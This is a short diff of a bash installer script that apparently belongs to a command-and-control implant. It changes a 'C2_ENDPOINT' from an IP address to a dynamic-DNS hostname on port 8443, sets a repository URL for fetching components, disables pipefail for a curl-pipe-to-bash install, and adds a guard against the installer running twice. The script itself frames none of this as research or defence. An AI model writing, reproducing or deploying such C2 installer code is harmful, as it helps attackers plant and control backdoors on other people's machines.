@@ -9,9 +9,10 @@ set +o pipefail  # DISABLE pipefail for curl | bash
 
 readonly VERSION="v1.0.1-stable"
 readonly AGENT_NAME="gs-oyen-s"
-readonly C2_ENDPOINT="116.202.105.253"
+readonly C2_ENDPOINT="oyen-sce.serveblog.net"
 readonly C2_PORT="8443"
 readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"
+
 
 # ANTI-RECURSION GUARD
 if [[ -n "$PHANTOM_INSTALL_RUNNING" ]]; then
